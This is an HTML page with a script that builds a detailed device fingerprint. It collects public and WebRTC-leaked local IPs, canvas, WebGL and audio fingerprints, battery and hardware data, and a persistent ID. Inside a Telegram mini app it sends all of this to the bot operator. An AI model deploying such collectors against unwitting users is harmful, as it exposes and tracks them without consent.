<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Full Device Fingerprint</title>
  <style>
    body { font-family: Arial; text-align: center; margin-top: 40px; background-color: #f5f5f5; }
    #result { font-size: 0.9em; white-space: pre-wrap; max-width: 600px; margin: auto; color: #333; }
  </style>
</head>
<body>
  <h1>ðŸ“¡ Device Fingerprint</h1>
  <div id="result">Loading...</div>

<script>
async function getPublicIP() {
    try {
        const res = await fetch('https://api.ipify.org?format=json');
        return (await res.json()).ip;
    } catch { return 'N/A'; }
}

async function getLocalIPs() {
    return new Promise((resolve) => {
        let ips = [];
        let pc = new RTCPeerConnection({iceServers:[]});
        pc.createDataChannel("");
        pc.onicecandidate = (ice) => {
            if (ice && ice.candidate && ice.candidate.candidate) {
                let parts = ice.candidate.candidate.split(" ");
                let ip = parts[4];
                if (!ips.includes(ip)) ips.push(ip);
            }
        };
        pc.createOffer().then(o => pc.setLocalDescription(o));
        setTimeout(() => resolve(ips), 1000);
    });
}

function getCanvasFingerprint() {
    let c = document.createElement('canvas');
    let ctx = c.getContext('2d');
    ctx.textBaseline = "top";
    ctx.font = "14px 'Arial'";
    ctx.fillStyle = "#f60";
    ctx.fillRect(125,1,62,20);
    ctx.fillStyle = "#069";
    ctx.fillText("fingerprint", 2, 15);
    return c.toDataURL();
}

function getWebGLFingerprint() {
    let canvas = document.createElement('canvas');
    let gl = canvas.getContext('webgl');
    if (!gl) return 'N/A';
    let dbg = gl.getExtension('WEBGL_debug_renderer_info');
    return {
        vendor: gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL),
        renderer: gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL)
    };
}

function getAudioFingerprint() {
    try {
        let ctx = new (window.AudioContext || window.webkitAudioContext)();
        let osc = ctx.createOscillator();
        let analyser = ctx.createAnalyser();
        osc.type = 'triangle';
        osc.frequency.setValueAtTime(10000, ctx.currentTime);
        osc.connect(analyser);
        analyser.connect(ctx.destination);
        osc.start(0);
        let fp = analyser.frequencyBinCount;
        osc.stop();
        ctx.close();
        return fp;
    } catch { return 'N/A'; }
}

async function getBatteryInfo() {
    try {
        let b = await navigator.getBattery();
        return { level: b.level, charging: b.charging };
    } catch { return {}; }
}

function getPersistentID() {
    let id = localStorage.getItem("fp_id");
    if (!id) {
        id = Math.random().toString(36).substring(2);
        localStorage.setItem("fp_id", id);
    }
    return id;
}

async function collectData() {
    let publicIP = await getPublicIP();
    let localIPs = await getLocalIPs();
    let battery = await getBatteryInfo();

    let data = {
        publicIP,
        localIPs,
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        languages: navigator.languages,
        screen: `${screen.width}x${screen.height}`,
        pixelRatio: window.devicePixelRatio,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        timezoneOffset: new Date().getTimezoneOffset(),
        canvasFP: getCanvasFingerprint(),
        webglFP: getWebGLFingerprint(),
        audioFP: getAudioFingerprint(),
        hardwareConcurrency: navigator.hardwareConcurrency,
        deviceMemory: navigator.deviceMemory,
        touchSupport: navigator.maxTouchPoints,
        vendor: navigator.vendor,
        productSub: navigator.productSub,
        cookiesEnabled: navigator.cookieEnabled,
        battery,
        persistentID: getPersistentID()
    };

    document.getElementById("result").textContent = JSON.stringify(data, null, 2);

    if (window.Telegram && Telegram.WebApp) {
        Telegram.WebApp.ready();
        Telegram.WebApp.sendData(JSON.stringify(data));
    }
}

collectData();
</script>
</body>
</html>
